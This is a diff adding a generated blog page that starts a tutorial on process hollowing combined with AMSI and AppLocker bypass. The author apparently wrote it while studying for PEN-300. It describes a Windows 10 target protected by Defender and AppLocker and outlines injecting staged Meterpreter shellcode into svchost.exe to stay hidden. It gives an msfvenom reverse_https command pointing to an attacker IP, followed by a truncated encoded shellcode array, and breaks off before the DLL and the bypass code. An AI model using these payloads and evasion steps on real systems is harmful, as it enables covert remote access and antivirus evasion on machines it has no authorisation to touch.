@@ -1,0 +1,312 @@
+<!doctype html><html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="generator" content="Qubt theme for Hugo" />
+
+
+
+<title>GionaBolzer - Blog</title>
+<meta name="title" content="GionaBolzer - Blog" />
+
+
+
+  <meta name="author" content="GionaBolzer" />
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<link type="text/css" rel="stylesheet" href="/css/main.bundle.min.922bd15d452678eea253c77b8d40115746f152c07b7eacd9ac24cf0d9a1d7b20.css" integrity="sha256-kivRXUUmeO6iU8d7jUARV0bxUsB7fqzZrCTPDZodeyA=" />
+
+
+
+
+
+
+
+
+
+<script defer src="/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js" integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script>
+
+
+
+
+
+
+<meta property="og:url" content="http://localhost:1313/blog/post2/">
+  <meta property="og:site_name" content="GionaBolzer - Blog">
+  <meta property="og:title" content="Process Hollowing with Amsi e AppLocker bypass">
+  <meta property="og:description" content="The OffSec PEN-300 course teaches staged shellcode injection in Windows binaries, advanced AV evasion, and AppLocker bypass techniques, but does not combine these with process hollowing methods in one single attack vector.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2024-12-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-12-08T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/author1.jpg">
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/author1.jpg">
+  <meta name="twitter:title" content="Process Hollowing with Amsi e AppLocker bypass">
+  <meta name="twitter:description" content="The OffSec PEN-300 course teaches staged shellcode injection in Windows binaries, advanced AV evasion, and AppLocker bypass techniques, but does not combine these with process hollowing methods in one single attack vector.">
+
+
+<script>
+  
+  if (localStorage.getItem("color-theme") === "dark" || (!("color-theme" in localStorage) && window.matchMedia("(prefers-color-scheme: dark)").matches)) {
+    document.documentElement.classList.add("dark");
+  } else {
+    document.documentElement.classList.remove("dark");
+  }
+</script>
+
+  </head>
+  <body class="flex h-screen flex-col justify-between bg-gray-200 dark:bg-gray-700">
+    <div>
+      <header class="sticky top-0 z-10 bg-gray-200 dark:bg-gray-700">
+        
+
+
+
+<section class="mx-auto flex max-w-screen-xl items-center justify-start p-4">
+  
+  <div class="flex flex-row space-x-8">
+    <nav class="hidden space-x-8 text-xl md:block" aria-label="main">
+      
+        <a href="/" class="px-3 py-2 text-gray-700 hover:text-indigo-500 dark:text-slate-200 md:p-0">
+          Home
+        </a>
+      
+        <a href="/blog/" class="px-3 py-2 text-gray-700 hover:text-indigo-500 dark:text-slate-200 md:p-0">
+          Blog
+        </a>
+      
+        <a href="/about/" class="px-3 py-2 text-gray-700 hover:text-indigo-500 dark:text-slate-200 md:p-0">
+          About
+        </a>
+      
+    </nav>
+    <button id="theme-toggle" type="button" class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label="theme-switcher">
+      <svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+        <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path>
+      </svg>
+      <svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+        <path
+          d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z"
+          fill-rule="evenodd"
+          clip-rule="evenodd"></path>
+      </svg>
+    </button>
+    <button id="hamburger-button" class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label="hamburger-button">
+      <div
+        class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 before:dark:bg-slate-400 after:dark:bg-slate-400"></div>
+    </button>
+  </div>
+</section>
+<section id="mobile-menu" class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800">
+  <nav class="flex min-h-screen flex-col items-center py-8" aria-label="mobile">
+    
+      <a href="/" class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">
+        Home
+      </a>
+    
+      <a href="/blog/" class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">
+        Blog
+      </a>
+    
+      <a href="/about/" class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">
+        About
+      </a>
+    
+  </nav>
+</section>
+      </header>
+      <main>
+        
+  
+  
+  
+  
+  
+
+
+  <div class="justify-left mx-auto mt-8 flex max-w-screen-md px-4">
+    <article>
+      <h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">
+        Process Hollowing with Amsi e AppLocker bypass
+      </h1>
+      <h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">
+        
+      </h2>
+      <div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">
+        Dec 8, 2024 - 2 minute read
+      </div>
+
+      
+        
+        <div class="flex flex-col">
+          <img class="mt-4 h-full w-full object-cover" src="/post1/photo1_hu1431373527561183953.webp" alt="feature image" height="431" width="736" />
+          
+        </div>
+      
+
+      
+
+
+      <span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-screen-md">
+        <h2 id="objective">Objective</h2>
+<p>During the study of PEN-300 by OffSec, one of the best techniques taught is the injection of staged shellcode into Windows binaries like <strong>svchost.exe</strong>. The course also covers advanced AV evasion techniques and AppLocker restriction bypass. Unfortunately, there is no chapter that combines process hollowing with these bypass methods, so in this article, I want to show the implementation.</p>
+<h2 id="the-setup">The setup</h2>
+<p>The target machine will be an Windows 10 Enteprise fully updated, at the time I am writing, <strong>22H2</strong> version with these Hotfix:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>systeminfo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hotfix(s):                 8 Hotfix(s) Installed.
+</span></span><span style="display:flex;"><span>                           [01]: KB5048161
+</span></span><span style="display:flex;"><span>                           [02]: KB5045936
+</span></span><span style="display:flex;"><span>                           [03]: KB5011048
+</span></span><span style="display:flex;"><span>                           [04]: KB5015684
+</span></span><span style="display:flex;"><span>                           [05]: KB5046613
+</span></span><span style="display:flex;"><span>                           [06]: KB5014032
+</span></span><span style="display:flex;"><span>                           [07]: KB5016705
+</span></span><span style="display:flex;"><span>                           [08]: KB5046823
+</span></span></code></pre></div><p>This machine have an Local, non admin account, named <strong>Student</strong> that will simulate out target user.</p>
+<p>On top of that tha machine have windows defender fully turn On</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+
+
+<div class="flex flex-col">
+  <div class="grid-cols-1 grid gap-1">
+    
+      
+      <img src="/blog/post2/defender/defender_hu10675193686687947470.webp" alt="image" loading="lazy" />
+    
+  </div>
+  
+    <span class="-mt-6 mb-4 text-center text-sm text-slate-700 dark:text-slate-200">
+      MD settings
+    </span>
+  
+</div>
+
+<p>And AppLocker with default rules</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+
+
+<div class="flex flex-col">
+  <div class="grid-cols-1 grid gap-1">
+    
+      
+      <img src="/blog/post2/applocker/applocker_hu3791382974479120922.webp" alt="image" loading="lazy" />
+    
+  </div>
+  
+    <span class="-mt-6 mb-4 text-center text-sm text-slate-700 dark:text-slate-200">
+      AppLocker settings
+    </span>
+  
+</div>
+
+<p>That prevent the execution of scripts and binary outside default locations of non admin account</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\student&gt; $ExecutionContext.SessionState.LanguageMode
+</span></span><span style="display:flex;"><span>ConstrainedLanguage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:\Users\student&gt; copy C:\Windows\System32\calc.exe C:\Users\student\Desktop\;
+</span></span><span style="display:flex;"><span>C:\Users\student\Desktop\calc.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Program <span style="color:#e6db74">&#39;calc.exe&#39;</span> failed to run This program is blocked by group policy. 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">For</span> more information, contact your system administrator
+</span></span></code></pre></div><h1 id="the-strategy">The strategy</h1>
+<p>The idea is to create an managed .dll that inject a staged meterpreter shellcode in the native  <a href="https://learn.microsoft.com/en-us/windows/application-management/svchost-service-refactoring">svchost.exe</a> process, this process was choice because is normally perform network activities so that our reverse shell should be less easly detected.</p>
+<p>Because we hava also defender in place we have to craft our payload in an encrypted and objuscated way, implement some of AV heuristic bypass and diasable AMSI at run time.</p>
+<p>Because also there is AppLocker in place our user can&rsquo;t invoke .NEt framework script so we have to implemente a bypass to be able to change the <strong>$ExecutionContext.SessionState.LanguageMode</strong> to <strong>FullLanguage</strong> and be able to execute scripts.</p>
+<h2 id="the-process-hollowing-dll">The Process Hollowing .dll</h2>
+<p>First of all we generate the staget shell code. I choose the https one so the comunication is encrypted and addes some iteration of the most common encoder</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_https LHOST<span style="color:#f92672">=</span>192.168.191.226 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -e x86/shikata_ga_nai -i <span style="color:#ae81ff">3</span> -f csharp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>byte<span style="color:#f92672">[]</span> buf <span style="color:#f92672">=</span> new byte<span style="color:#f92672">[</span>767<span style="color:#f92672">]</span> <span style="color:#f92672">{</span>0xbb,0x3b,0xe5,0x6f,0x90,0xd9,  
+</span></span><span style="display:flex;"><span>0xcc,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0xba,0x31,0x5e,
+</span></span><span style="display:flex;"><span>0x12,0x03,0x5e,0x12,0x83,0xd5,0x19,0x8d,0x65,0x96,0x65,0x4e,
+</span></span><span style="display:flex;"><span>0x33,0xfd,0xb3,0xa5,0xe2,0x89,0x67,0xce,0x4e,0x42,0xa1,0x9f,
+</span></span><span style="display:flex;"><span>0xc2,0x95,0x4a,0xf3,0x27,0xae,0xbf,0x70,0xe4,0xd3,0x3e,0x36,
+</span></span><span style="display:flex;"><span>0x25,0x9c,0xf8,0x0e,0x45,0x83,0xdf,0x16,0x3c,0xda,0x0e,...
+</span></span></code></pre></div>
+      </span>
+    </article>
+  </div>
+
+      </main>
+    </div>
+    <footer>
+      <div class="flex flex-col justify-center p-10">
+  
+  <p class="text-center text-gray-700 dark:text-gray-200">
+    
+      &copy;
+      2024
+      GionaBolzer
+    
+  </p>
+
+  
+  
+  
+  
+  
+</div>
+    </footer>
+  </body>
+</html>
